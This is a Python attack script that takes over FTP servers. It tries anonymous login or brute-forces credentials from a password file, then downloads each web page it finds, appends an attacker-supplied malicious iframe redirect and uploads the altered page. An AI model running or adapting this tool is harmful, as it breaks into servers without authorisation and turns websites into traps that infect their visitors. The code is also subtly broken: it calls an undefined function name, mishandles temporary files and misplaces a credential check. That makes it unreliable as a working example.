import ftplib
import optparse
import time
import os.path


def anon_login(hostname):
    """Try anonymous login to FTP server."""
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous', 'me@your.com')
        print(f'[*] {hostname} FTP Anonymous Logon Succeeded.')
        ftp.quit()
        return True
    except Exception as e:
        print(f'[-] {hostname} FTP Anonymous Logon Failed: {e}')
        return False


def brute_login(hostname, passwd_file):
    """Try brute force login to FTP server using a password file."""
    if not os.path.isfile(passwd_file):
        print(f'[-] Password file {passwd_file} not found.')
        return None, None
    
    with open(passwd_file, 'r') as pF:
        for line in pF.readlines():
            time.sleep(1)
            username, password = line.strip().split(':')
            print(f'[+] Trying: {username}/{password}')
            try:
                ftp = ftplib.FTP(hostname)
                ftp.login(username, password)
                print(f'[*] {hostname} FTP Logon Succeeded: {username}/{password}')
                ftp.quit()
                return username, password
            except Exception as e:
                pass
            
    print('[-] Could not brute force FTP credentials.')
    return None, None


def return_default(ftp):
    """Return a list of default pages in FTP server."""
    try:
        dir_list = ftp.nlst()
    except Exception as e:
        print(f'[-] Could not list directory contents: {e}')
        return []
    
    ret_list = []
    for file_name in dir_list:
        fn = file_name.lower()
        if fn.endswith(('.php', '.htm', '.asp')):
            print(f'[+] Found default page: {file_name}')
            ret_list.append(file_name)
    return ret_list


def inject_page(ftp, page, redirect):
    """Inject malicious redirect code into a page."""
    try:
        with open(page, 'r') as f:
            f.close()
    except Exception as e:
        print(f'[-] Could not read file: {page}')
        return

    try:
        with open(page + '.tmp', 'w') as f:
            ftp.retrlines(f'RETR {page}', f.write)
            print(f'[+] Downloaded Page: {page}')
            f.write(redirect)
            f.close()
            print(f'[+] Injected Malicious IFrame on: {page}')
            ftp.storlines(f'STOR {page}', open(page + '.tmp'))
            print(f'[+] Uploaded Injected Page: {page}')
    except Exception as e:
        print(f'[-] Could not inject malicious code into: {page}: {e}')
        
    try:
        ftp.delete(page + '.tmp')
        print(f'[+] Removed temporary file: {page}.tmp')
    except Exception as e:
        pass


def attack(username, password, tgt_host, redirect):
    """Attack FTP server with given credentials and redirection page."""
    ftp = ftplib.FTP(tgt_host)
    try:
        ftp.login(username, password)
        print(f'[*] {tgt_host} FTP Logon Succeeded: {username}/{password}')
        def_pages = return_default(ftp)
        for def_page in def_pages:
            inject_page(ftp, def_page, redirect)
    except Exception as e:
        print(f'[-] {tgt_host} FTP Logon Failed: {username}/{password}: {e}')
    ftp.quit()

        
def main():
    parser = optparse.OptionParser('usage%prog '+\
    '-H <target host[s]> -r <redirect page>'+\
    '[-f <userpass file>]')
    parser.add_option('-H', dest='tgtHosts', \
    type='string', help='specify target host')
    parser.add_option('-f', dest='passwdFile', \
    type='string', help='specify user/password file')
    parser.add_option('-r', dest='redirect', \
    type='string', help='specify a redirection page')
    (options, args) = parser.parse_args()
    tgtHosts = str(options.tgtHosts).split(', ')
    passwdFile = options.passwdFile
    redirect = options.redirect
    if tgtHosts == None or redirect == None:
        print (parser.usage)
        exit(0)
    for tgtHost in tgtHosts:
        username = None
        password = None
        if anon_login(tgtHost) == True:
            username = 'anonymous'
            password = 'me@your.com'
            print ('[+] Using Anonymous Creds to attack')
            attack(username, password, tgtHost, redirect)
        elif passwdFile != None:
            (username, password) =\
            bruteLogin(tgtHost, passwdFile)
    if password != None:
        print('[+] Using Creds: ' +\
        username + '/' + password + ' to attack')
        attack(username, password, tgtHost, redirect)
if __name__ == '__main__':
    main()